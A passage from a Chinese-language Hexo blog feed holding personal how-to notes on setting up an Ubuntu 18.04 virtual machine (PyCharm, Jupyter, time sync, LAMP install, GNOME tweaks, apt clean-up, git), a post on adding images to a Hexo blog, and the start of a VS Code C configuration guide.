title="调整终端字体大小"></a>调整终端字体大小</h2><p>默认的实在太小了,眼都快瞎了&gt;&lt;</p><ol><li><p>终端右键<code>Preferences</code></p></li><li><p>按图搞一波~~</p><p><img src="Snipaste_2020-04-02_09-37-01.png" alt="Snipaste_2020-04-02_09-37-01"></p></li></ol><h2 id="pycharm"><a href="#pycharm" class="headerlink" title="pycharm"></a>pycharm</h2><p>本来对pycharm无感的来着,在成功申请jetbrains的学生优惠后……</p><p>真香</p><p>jetbrain的操作都差不多,webstore的安装,修改,加速都和pycharm一样</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ol><li><p>下载linux版本的jetbrains toolbox: <a href="https://www.jetbrains.com/toolbox-app/" target="_blank" rel="noopener">https://www.jetbrains.com/toolbox-app/</a></p></li><li><p>拖到虚拟机,提取,点击即可使用</p></li><li><p>十分方便下载,如图</p><p><img src="Snipaste_2020-04-02_09-42-08.png" alt="Snipaste_2020-04-02_09-42-08"></p></li></ol><h3 id="修改字体大小"><a href="#修改字体大小" class="headerlink" title="修改字体大小"></a>修改字体大小</h3><ul><li><p>file—&gt;setting</p></li><li><p>如图修改菜单栏字体大小</p><p><img src="Snipaste_2020-04-02_10-40-17.png" alt="Snipaste_2020-04-02_10-40-17"></p></li><li><p>如图修改代码字体大小</p><p><img src="Snipaste_2020-04-02_10-42-32.png" alt="Snipaste_2020-04-02_10-42-32"></p></li></ul><h3 id="jupyter-notebook"><a href="#jupyter-notebook" class="headerlink" title="jupyter notebook"></a>jupyter notebook</h3><p><strong>安装</strong></p><p>一开始是从anaconda开始的,所以对jupyter有特殊的情感呢</p><p>所以听说pycharm支持了,就搞起来试试</p><ol><li><p>终端:<code>pip install jupyter</code></p><p>==我看博客上都是直接pip的,但是安装后发现里面只有python2,所以”pip3 install jupyter”试试,ojbk==</p></li><li><p>下载的过程中报了好几次错(记录一下报错及处理方法)</p><ul><li>timeout: 继续下,不要管,反正好像是接着下的(我怀疑是网的原因)</li><li>setuptool: <code>pip install setuptools==33.1.1</code></li></ul></li></ol><p><strong>使用</strong></p><ol><li><p>如果不是pycharm用的话,直接终端输入<code>jupyter notebook</code>就可以在浏览器中开一个了,直接用就行</p><p>还是原来的配方,还是原来的味道</p></li><li><p>pycharm有两种使用方式</p><p>==不知道有没有编程浏览器那种的排版方式,左右的真的不习惯啊==</p><ul><li><p>new一个file,选择jupyter类型,第一次使用,会提示你下载插件,下载完就行了</p><p><img src="Snipaste_2020-04-02_10-01-58.png" alt="Snipaste_2020-04-02_10-01-58"></p></li><li><p>在终端中使用</p><p><img src="Snipaste_2020-04-02_10-02-16.png" alt="Snipaste_2020-04-02_10-02-16"></p></li></ul></li></ol><h3 id="加速"><a href="#加速" class="headerlink" title="加速"></a>加速</h3><p>pycharm打开有点慢,而且经常卡死,所以要修改一下配置</p><p>调整一下堆的大小,如图操作</p><ol><li>help–&gt;find action</li></ol><p><img src="Snipaste_2020-04-02_10-17-28.png" alt="Snipaste_2020-04-02_10-17-28"></p><ol start="2"><li>搜索vm options…</li></ol><p><img src="Snipaste_2020-04-02_10-18-13.png" alt="Snipaste_2020-04-02_10-18-13"></p><ol start="3"><li>修改</li></ol><p><img src="Snipaste_2020-04-02_10-20-28.png" alt="Snipaste_2020-04-02_10-20-28"></p><ol start="4"><li>使用体验: 确实快了很多</li></ol><h2 id="时间同步"><a href="#时间同步" class="headerlink" title="时间同步"></a>时间同步</h2><p>搞了半天,一看时间,嗯,还早</p><p>退出来一看……wtf!!!</p><p>啊,同步时间,迫在眉睫</p><ol><li><p>查看时区(我的已经改过来了,原来是utc)</p><ul><li>UTC:协调世界时</li><li>CST:北京时间</li></ul><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">date</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="Snipaste_2020-04-02_13-01-43.png" alt="Snipaste_2020-04-02_13-01-43"></p><ol start="2"><li>查看是否同步</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo timedatectl</span></span><br></pre></td></tr></table></figure><p><img src="Snipaste_2020-04-02_13-05-13.png" alt="Snipaste_2020-04-02_13-05-13"></p><ul><li><p>如果是no</p><p>重启服务(看看yes了没)</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="keyword"> system</span>ctl restart<span class="keyword"> system</span>d-timesyncd.service</span><br></pre></td></tr></table></figure><p>启动服务(再康康yes了没)</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sudo </span><span class="string">timedatectl </span><span class="built_in">set-ntp</span> <span class="string">true</span></span><br></pre></td></tr></table></figure><p>还不行?那我也木的办法了</p></li></ul><ol start="3"><li><p>更改时区</p><ul><li><p>列出可用时区(按q退出)</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl <span class="built_in">list</span>-timezones</span><br></pre></td></tr></table></figure></li></ul></li></ol><pre><code>![Snipaste_2020-04-02_13-10-19](Snipaste_2020-04-02_13-10-19.png)</code></pre><ul><li><p>设置新时区(以上海为例)</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sudo </span><span class="string">timedatectl </span><span class="built_in">set-timezone</span> <span class="string">Asia/</span><span class="string">Shanghai</span></span><br></pre></td></tr></table></figure></li></ul><ol start="4"><li><p>要是想换回原来的时区</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sudo </span><span class="string">timedatectl </span><span class="built_in">set-timezone</span> <span class="string">UTC</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="搭服务器"><a href="#搭服务器" class="headerlink" title="搭服务器"></a>搭服务器</h2><p>先下一堆东西</p><ol><li><p>ssh</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install ssh</span><br></pre></td></tr></table></figure></li><li><p>apache</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install apache2</span><br></pre></td></tr></table></figure><p>apache默认网站的文件根目录在/var/www下面，html文件夹下面有个index.html里面记录的信息就是我们当时访问localhost，浏览器所显示的东西</p><ul><li><p>sudo systemctl start apache2 //启动</p></li><li><p>sudo systemctl stop apache2 //停止</p></li><li><p>sudo systemctl restart apache2 //重启</p></li><li><p>sudo systemctl reload apache2 //在不重新启动连接的情况下应用配置更改。</p></li><li><p>sudo systemctl disable apache2 //禁止开机自启</p></li></ul></li><li><p>mysql</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install mysql-<span class="keyword">server</span></span><br></pre></td></tr></table></figure></li><li><p>mysql-client</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install mysql-client</span><br></pre></td></tr></table></figure></li><li><p>php</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install php</span><br></pre></td></tr></table></figure></li><li><p>php&amp;apache的连接件</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install libapache2-<span class="keyword">mod</span>-php</span><br></pre></td></tr></table></figure></li><li><p>phpmyadmin</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install phpmyadmin</span><br></pre></td></tr></table></figure></li></ol><h2 id="中文"><a href="#中文" class="headerlink" title="中文"></a>中文</h2><ol><li>在应用中找到<code>language supporting</code></li></ol><p><img src="Snipaste_2020-04-03_11-09-13.png" alt="Snipaste_2020-04-03_11-09-13"></p><ol start="2"><li><code>install/remove language</code>–&gt;<code>chines(simplifled)</code>–&gt;<code>apply</code></li></ol><p><img src="Snipaste_2020-04-03_11-10-12.png" alt="Snipaste_2020-04-03_11-10-12"></p><ol start="3"><li><p>下载过程中会让你输入密码</p></li><li><p>手动把中国汉字拉到第一个,apply</p><p><img src="Snipaste_2020-04-03_11-17-26.png" alt="Snipaste_2020-04-03_11-17-26"></p></li><li><p>重启</p></li><li><p>ojbk</p></li></ol><h2 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h2><ol><li><p><code>sudo apt-get install gnome-tweak-tool</code></p></li><li><p><code>sudo apt-get install  gnome-shell-extension-dashtodock</code></p><p>扩展,用于配置任务栏(我想把放到下面并居中)</p></li><li><p>重启</p></li><li><p><code>gnome-tweaks</code>,或从应用中打开,中文名为优化</p><p><img src="Snipaste_2020-04-03_11-44-19.png" alt="Snipaste_2020-04-03_11-44-19"></p></li><li><p>根据自己的喜好进行配置</p></li></ol><p>附我的配置</p><ol><li><p>主题(其实这个外观已经时应用后的样子了)</p><p><img src="Snipaste_2020-04-03_11-45-40.png" alt="Snipaste_2020-04-03_11-45-40"></p></li><li><p>任务栏</p><p><img src="Snipaste_2020-04-03_11-47-58.png" alt="Snipaste_2020-04-03_11-47-58"></p><p>配置</p><p><img src="Snipaste_2020-04-03_11-50-04.png" alt="Snipaste_2020-04-03_11-50-04"></p><p>结果</p><p><img src="Snipaste_2020-04-03_11-51-51.png" alt="Snipaste_2020-04-03_11-51-51"></p></li></ol><h2 id="腾点空间"><a href="#腾点空间" class="headerlink" title="腾点空间"></a>腾点空间</h2><p>为啥突然想不开,搞清理呢?</p><p>我的破电脑空间不够用了,大清理了一番</p><p>居安思危,觉得虚拟机也得清理  <del>(什么歪理啊,tui)</del></p><h3 id="清理垃圾"><a href="#清理垃圾" class="headerlink" title="清理垃圾"></a>清理垃圾</h3><p>Ubuntu系统在运行时是不会产生无用垃圾的。但是我们在升级系统时，软件管理器下载的软件包，系统则不会自动删除，其实这样做也是考虑到你可能会再次安装从而加快再次安装的速度考虑。</p><p>删除已卸载掉软件包</p><p><code>sudo apt-get autoclean</code></p><p>删除所有安装包</p><p><code>sudo apt-get clean</code></p><p>删除孤立包(某些软件的依赖项,但别的软件用不上)</p><p><code>sudo apt-get autoremove</code></p><h3 id="删除老旧内核"><a href="#删除老旧内核" class="headerlink" title="删除老旧内核"></a>删除老旧内核</h3><ol><li><p>查看内核版本,免得误删</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname -r</span></span><br></pre></td></tr></table></figure><p><img src="image-20200404123816670.png" alt="image-20200404123816670"></p></li><li><p>显示文件</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">dpkg</span> --<span class="meta">get</span>-<span class="keyword">selections </span><span class="title">| grep linux</span></span><br></pre></td></tr></table></figure><p>已经删完了,就补张图好了&gt;&lt;</p><p><img src="image-20200404124053791.png" alt="image-20200404124053791"></p></li><li><p>删掉低版本的内核文件image、头文件headers</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> purge  内核文件名  头文件名</span><br></pre></td></tr></table></figure></li></ol><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><ol><li><p>下载(我下的时候已经默认存在了)</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> git</span><br></pre></td></tr></table></figure></li><li><p>查看版本</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="comment">--version</span></span><br></pre></td></tr></table></figure></li><li><p>配置名称和邮箱</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--global user.name <span class="string">"123"</span></span><br><span class="line">git<span class="built_in"> config </span>--global user.email <span class="string">"123@123.net"</span></span><br></pre></td></tr></table></figure><p>可通过查看.gitconfig来验证配置更改</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--list</span><br></pre></td></tr></table></figure><p>如果用了 <strong>–global</strong> 选项，那么更改的配置文件就是位于你用户主目录下的那个，以后你所有的项目都会默认使用这里配置的用户信息。</p><p>如果要在某个特定的项目中使用其他名字或者电邮，只要去掉 –global 选项重新配置即可，新的设定保存在当前项目的 .git/config 文件里。</p></li></ol><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>N: 无法安全地用该源进行更新，所以默认禁用该源。</p><p><img src="Snipaste_2020-04-04_13-01-51.png" alt="Snipaste_2020-04-04_13-01-51"></p><p>打开<strong>软件与更新</strong></p><p><img src="Snipaste_2020-04-04_13-02-13.png" alt="Snipaste_2020-04-04_13-02-13"></p><p><strong>其他软件</strong>–&gt;把勾去掉</p><p><img src="Snipaste_2020-04-04_13-03-15.png" alt="Snipaste_2020-04-04_13-03-15"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p>奇奇怪怪: <a href="https://zhuanlan.zhihu.com/p/56253982" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/56253982</a></p><p>sogou: <a href="https://blog.csdn.net/lupengCSDN/article/details/80279177" target="_blank" rel="noopener">https://blog.csdn.net/lupengCSDN/article/details/80279177</a></p><p>vscode</p><blockquote><p>vscode安装: <a href="https://linuxize.com/post/how-to-install-visual-studio-code-on-ubuntu-18-04/" target="_blank" rel="noopener">https://linuxize.com/post/how-to-install-visual-studio-code-on-ubuntu-18-04/</a></p><p>配置py: <a href="https://blog.csdn.net/yk150915/article/details/81087282" target="_blank" rel="noopener">https://blog.csdn.net/yk150915/article/details/81087282</a></p><p>配置c: <a href="https://segmentfault.com/a/1190000020155987" target="_blank" rel="noopener">https://segmentfault.com/a/1190000020155987</a></p></blockquote><p>sublime text3: <a href="https://www.linuxidc.com/Linux/2019-03/157533.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2019-03/157533.htm</a></p><p>jdk-8: <a href="https://blog.csdn.net/zbj18314469395/article/details/86064849" target="_blank" rel="noopener">https://blog.csdn.net/zbj18314469395/article/details/86064849</a></p><p>pycharm</p><blockquote><p>jupyter安装失败: <a href="https://blog.csdn.net/jiangzubing520/article/details/80253792?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/jiangzubing520/article/details/80253792?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p><p>pycharm中jupyter使用方法: <a href="https://blog.csdn.net/xiemanR/article/details/71837385" target="_blank" rel="noopener">https://blog.csdn.net/xiemanR/article/details/71837385</a></p><p>pycharm加速: <a href="https://blog.csdn.net/jack339083590/article/details/79261717?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/jack339083590/article/details/79261717?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p></blockquote><p>时间同步: <a href="https://linux.cn/article-11220-1.html" target="_blank" rel="noopener">https://linux.cn/article-11220-1.html</a></p><p>中文: <a href="https://m.jb51.net/os/Ubuntu/298601.html" target="_blank" rel="noopener">https://m.jb51.net/os/Ubuntu/298601.html</a></p><p>美化: <a href="https://blog.csdn.net/weixin_43629813/article/details/100525856" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43629813/article/details/100525856</a></p><p>清理: <a href="https://blog.csdn.net/levon2018/article/details/81746613?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">https://blog.csdn.net/levon2018/article/details/81746613?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1</a></p><p>git: <a href="https://www.linuxidc.com/Linux/2018-05/152610.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2018-05/152610.htm</a></p><p>问题: <a href="https://blog.csdn.net/weixin_42966187/article/details/89380505" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42966187/article/details/89380505</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从零开始ubuntu-18-04&quot;&gt;&lt;a href=&quot;#从零开始ubuntu-18-04&quot; class=&quot;headerlink&quot; title=&quot;从零开始ubuntu 18.04&quot;&gt;&lt;/a&gt;从零开始ubuntu 18.04&lt;/h1&gt;&lt;hr&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;
      
    
    </summary>
    
    
      <category term="虚拟机" scheme="https://mercer5.github.io/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    
      <category term="虚拟机" scheme="https://mercer5.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
      <category term="linux" scheme="https://mercer5.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>blod插入图片</title>
    <link href="https://mercer5.github.io/2020/04/04/blod%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/"/>
    <id>https://mercer5.github.io/2020/04/04/blod%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</id>
    <published>2020-04-04T07:16:53.000Z</published>
    <updated>2020-08-24T15:30:09.732Z</updated>
    
    <content type="html"><![CDATA[<h1 id="blog插入图片"><a href="#blog插入图片" class="headerlink" title="blog插入图片"></a>blog插入图片</h1><h2 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h2><p>由于微博图床没了,博主只能苦逼的找方法解决博客上所有图片显示失败问题了.</p><p>目前有三种方法</p><ul><li>用dl的方法(百度你值得拥有)继续使用,但还是算了<ol><li>太麻烦了,每个图片都要改</li><li>免费的图床风险还是太大,说没就没</li></ol></li><li>买服务器,这条路也不准备走<del>问就是没钱</del></li><li>所以只能把图片保存在本地了: )</li></ul><h2 id="搞起来"><a href="#搞起来" class="headerlink" title="搞起来"></a>搞起来</h2><h3 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h3><p>可以将图片统一放在<code>source/images</code>文件夹中，通过markdown语法访问它们。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">source</span><span class="regexp">/images/im</span>age.jpg![](<span class="regexp">/images/im</span>age.jpg)</span><br></pre></td></tr></table></figure><h3 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h3><p>放在文章自己的目录中。文章的目录可以通过配置<code>_config.yml</code>来生成。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">_config</span>.</span></span>ymlpost_asset_folder: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>将<code>_config.yml</code>文件中的配置项<code>post_asset_folder</code>设为<code>true</code>后，执行命令<code>$ hexo new post_name</code>，在<code>source/_posts</code>中会生成文章<code>post_name.md</code>和同名文件夹<code>post_name</code>。将图片资源放在<code>post_name</code>中，文章就可以使用相对路径引用图片资源了。</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">_posts</span>/post_name/<span class="built_in">image</span>.jpg![](<span class="built_in">image</span>.jpg)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;blog插入图片&quot;&gt;&lt;a href=&quot;#blog插入图片&quot; class=&quot;headerlink&quot; title=&quot;blog插入图片&quot;&gt;&lt;/a&gt;blog插入图片&lt;/h1&gt;&lt;h2 id=&quot;现状&quot;&gt;&lt;a href=&quot;#现状&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="blog" scheme="https://mercer5.github.io/categories/blog/"/>
    
    
      <category term="blog" scheme="https://mercer5.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>vscode配置c</title>
    <link href="https://mercer5.github.io/2020/03/02/vscode%E9%85%8D%E7%BD%AEc/"/>
    <id>https://mercer5.github.io/2020/03/02/vscode%E9%85%8D%E7%BD%AEc/</id>
    <published>2020-03-02T05:43:52.000Z</published>
    <updated>2020-08-24T15:30:09.763Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vscode配置c"><a href="#vscode配置c" class="headerlink" title="vscode配置c"></a>vscode配置c</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过网上dl的教程我成功配置好c啦! 链接在这里<a href="https://hovenjay.github.io/2018/06/01/VSCodeC/" target="_blank" rel="noopener">https://hovenjay.github.io/2018/06/01/VSCodeC/</a></p><p>不过配置的过程还是很艰辛的,也有一些弯路,所以记录一下</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>Visual Studio Code:<a href="https://code.visualstudio.com/" target="_blank" rel="noopener">https://code.visualstudio.com/</a></p><p>MinGw-w64:<a href="https://sourceforge.net/projects/mingw-w64/" target="_blank" rel="noopener">https://sourceforge.net/projects/mingw-w64/</a> </p><h2 id="1-MinGW"><a href="#1-MinGW" class="headerlink" title="1. MinGW"></a>1. MinGW</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>MinGW 是一组包含文件和端口库，其功能是允许控制台模式的程序使用微软的标准C运行时（C Runtime）库</p><p>如果已经下载了devcpp还有其他什么编译器的可以不用下,在文件夹里找一下,会有的</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>首先下载 MinGW-w64 。下载完成之后我们开始安装 MinGw-w64，安装路径可以自由定义(自己找得到就行)</p><p>安装时需要设置的安装选项如下：</p><ul><li>Version ：GCC 版本，直接选最高；</li><li>Architecture ：CPU 架构，系统如果为64位，则选择 x86_64；</li><li>Threads ：API 模式，使用默认选项；</li><li>Exception ：异常处理方式，seh 仅针对 64 位架构，sjlj 则兼容 32 位架构；</li><li>Build revision ：修订版本，使用默认选项；</li></ul><p><img src="2018-06-01_12-44-09.png" alt="2018-06-01_12-44-09"></p><h3 id="加入环境"><a href="#加入环境" class="headerlink" title="加入环境"></a>加入环境</h3><p>在安装路径中找到 bin 文件夹，通常在 <code>${MinGW-w64安装位置}\mingw64\bin</code> </p><p>接下来，我们将刚刚获取的 bin 文件夹的路径添加到系统环境变量。</p><ul><li><p>win10的话,点击设置</p></li><li><p>搜索环境</p><p><img src="Snipaste_2020-03-02_12-44-11.png" alt="Snipaste_2020-03-02_12-44-11"></p></li><li><p>编辑系统环境path</p><p><img src="image-20200302124619131.png" alt="image-20200302124619131"></p></li><li><p>加入 bin 文件夹的路径</p><p><img src="image-20200302124736792.png" alt="image-20200302124736792"></p></li><li><p>检测环境变量是否配置正确</p><p>在命令行输入 gcc –version，如果返回的是已安装的 gcc 的版本信息，那么环境变量就配置正确了。</p></li></ul><h2 id="2-vscode插件"><a href="#2-vscode插件" class="headerlink" title="2. vscode插件"></a>2. vscode插件</h2><ol><li>c/c++</li><li>code runner</li><li>chinese <del>&gt;&lt;这个选下吼,不得不说太和我的心意了</del></li></ol><p>在下图所示位置搜索下载</p><p><img src="image-20200302125123334.png" alt="image-20200302125123334"></p><h2 id="3-创建和设置c语言工作开发区"><a href="#3-创建和设置c语言工作开发区" class="headerlink" title="3. 创建和设置c语言工作开发区"></a>3. 创建和设置c语言工作开发区</h2><p>在你的计算机中选择一个合适的位置，作为你的 C 语言开发工作区。建议工作区所在路径仅由字母、数字、下划线组成，不要包含其他的符号。</p><p>使用vscode打开你创建的工作区</p><p>在工作区新建一个 C 语言源文件命名为 hello.c ，输入以下内容：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello world!/n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="4-配置导入的头文件参数-c-cpp-properties-json"><a href="#4-配置导入的头文件参数-c-cpp-properties-json" class="headerlink" title="4. 配置导入的头文件参数 c_cpp_properties.json"></a>4. 配置导入的头文件参数 c_cpp_properties.json</h2><p>在编写完毕并保存之后，你可能会看到 #include 这句下面会有绿色波浪线，这是由于编译器没办法找到你所使用的头文件的所在位置。将光标移动到该行，行号左边会出现 <code>黄色小灯泡</code> ，点击会出现一个提示按钮：<code>Add include path to setting</code> ，继续点击该提示，则会在工作区 <code>.vscode</code> 下生成 <code>c_cpp_properties.json</code> 文件。将文件修改成下面内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"configurations"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"Win32"</span>,</span><br><span class="line">            <span class="attr">"includePath"</span>: [</span><br><span class="line">                <span class="string">"$&#123;workspaceFolder&#125;/**"</span>,</span><br><span class="line">                <span class="comment">//改成自己位置!!!!!!</span></span><br><span class="line">                <span class="string">"D:\\mingw64\\x86_64-w64-mingw32\\include"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"defines"</span>: [</span><br><span class="line">                <span class="string">"_DEBUG"</span>,</span><br><span class="line">                <span class="string">"UNICODE"</span>,</span><br><span class="line">                <span class="string">"_UNICODE"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"compilerPath"</span>: <span class="string">"D:\\mingw64\\bin\\gcc.exe"</span>,</span><br><span class="line">            <span class="attr">"cStandard"</span>: <span class="string">"c11"</span>,</span><br><span class="line">            <span class="attr">"cppStandard"</span>: <span class="string">"c++17"</span>,</span><br><span class="line">            <span class="attr">"intelliSenseMode"</span>: <span class="string">"clang-x64"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"version"</span>: <span class="number">4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-配置调试程序-launch-json"><a href="#5-配置调试程序-launch-json" class="headerlink" title="5. 配置调试程序 launch.json"></a>5. 配置调试程序 launch.json</h2><p>打开已经编写好的 hello.c ，然后按 <code>F5</code> 调试。因为是第一次调试，系统会弹出 <code>选择环境</code> 面板，这里选择 <code>C++(GDB/LLDB)</code> 。</p><p><img src="2018-06-01_12-44-04.png" alt="2018-06-01_12-44-04"></p><p>选择运行环境后，VS Code 会在工作区 <code>.vscode</code> 文件夹下创建 <code>luanch.json</code> 模板文件并打开，将文件内容清空，复制下面的内容到文件中并保存：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"0.2.0"</span>,</span><br><span class="line">    <span class="attr">"configurations"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 配置 VS Code 调试行为：</span></span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"GDB Debug"</span>, <span class="comment">// 设置在启动配置下拉菜单中显示调试配置的名称。</span></span><br><span 